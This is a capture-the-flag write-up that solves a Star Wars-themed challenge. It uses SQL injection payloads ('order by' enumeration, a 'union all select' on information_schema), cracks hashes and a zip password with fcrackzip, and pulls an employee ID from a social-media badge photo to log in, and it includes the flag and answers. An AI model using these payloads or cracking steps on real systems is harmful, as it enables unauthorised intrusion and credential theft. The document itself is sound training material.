# Challenge Zero
The challenge begins by directing to a website https://emprie.site/ and asking you to locate a way to log in

## SQL Injection
The Gallery page may immediatly be found to be vulnerable to a SQL injection. Furthermore, 
it's a pretty simple/straightforward injection to exploit.

### Enumerate the number of columns
```
1 order by 1
1 order by 2
1 order by 3
1 order by 4
1 order by 5
1 order by 6 <-- error
```

There are 5 columns returned as part of the query.

### Tables
```
1 union all select table_name, 2, 3, 4, 5 from information_schema.tables
```

Looks like there are three tables of interest:
* pages
* secret_pages
* users

#### Users table
Obtaining the list of columns from the users table reveals the following:

```
+------------------------------------------------------------------+-----------+
| password                                                         | username  |
+------------------------------------------------------------------+-----------+
| 2a8b3484cc216f51611d0f49b80029c66b5928df3939e344cb8d3dd4814c5bbc | tc_174812 |
| 2d579cd75056723657b8fa68fa6626c245cd362030159965efbdf41da2d67adf | tc_133337 |
+------------------------------------------------------------------+-----------+
```

Throwing the hashes into a hash cracker reveals that `tc_133337` has a password of `redherring`. 
That doesn't seem to be able to log in or anything, so it must actually be a...redherring.

#### Pages Table

```
+---------+----------+----------------------------------+---------------------------------------+----------------+
| page_id | is_draft | page_uri                         | page_title                            | page_thumbnail |
+---------+----------+----------------------------------+---------------------------------------+----------------+
| 1       | 0        | tie_fighter_speed.html           | Tie Fighters                          | tf.png         |
| 2       | 0        | storm_trooper_sharp_shooter.html | Storm Trooper Accuracy                | st.png         |
| 3       | 0        | death_star_reborn.html           | Death Star Reborn                     | deathstar.jpeg |
| 4       | 1        | redacted.html                    | REDACTED - Super Secret Plans Message | plan.jpg       |
+---------+----------+----------------------------------+---------------------------------------+----------------+
```

The `redacted.html` page seems interesting, however upon visiting it, the page just informs us 
that the page has moved to the `secret_pages` table.

#### Secret Pages Table

```
+---------+----------+---------------------------------+----------------------------+----------------+
| page_id | is_draft | page_uri                        | page_title                 | page_thumbnail |
+---------+----------+---------------------------------+----------------------------+----------------+
| 1       | 0        | super_secret_plans_message.html | Super Secret Plans Message | plan.jpg       |
+---------+----------+---------------------------------+----------------------------+----------------+
```

This `super_secret_plans_message.html` seems interesting, lets check it out! https://emprie.site/pages/super_secret_plans_message.html

## Morse Code
On the `super_secret_plans_message.html` page, there's an audio file that plays with what sounds like
morse code, throwing it into a .mp3 file and uploading it to a website (like this)[https://morsecode.world/international/decoder/audio-decoder-adaptive.html]
that can decode morse code gives us a URL:

https://c3p.xyz

## Password Cracking
The c3p.xyz website contains a password-protected .zip and a wordlist file, downloading the two and using
`frackzip` gives us the password:

```bash
$ fcrackzip -u -D -p wordlist.txt documents.zip                                                                                1 ⚙


PASSWORD FOUND!!!!: pw == itacolita
```

## Examine Documents
The ZIP file contained a few documents, but the most helpful is `disciplinary_note.txt` which conaints:

```
Emplpoyee Username: tc_trooper_174812
EmployeeID: ***-**-****
Date: 2045-04-06
Infraction: The employee was found posting sensitive information (EmployeeID) on social media. This kind of data breach could allow for unauthorized access to our employee portal.
Disciplinary Action: The employee must remove the post from their social media and obtain a new EmployeeID. This is their first warning.

**REMINDER DO NOT POST PICTURES OF BADGE ANYWHERE ONLINE! THIS CONTAINS YOUR SECRET EMPLOYEEID NUMBER!**
```

So, it seems that an employee `tc_trooper_174812` has revealed information. This took me a bit but it is
actually on a REAL social media page (not just part of the CTF). Searching for that username will give
you the [Instagram page for that user](https://www.instagram.com/p/CPCnYIOMIVo/)!

On the Instagram page, we can see a badge which lists `32145609` as the employee ID.

## Logging In
Going back to the original website and logging in with:

Username: `tc_trooper_174812`
Password: `32145609`

Success!

Flag: `silicon{B0rN_70_8E_R3b3ls}`

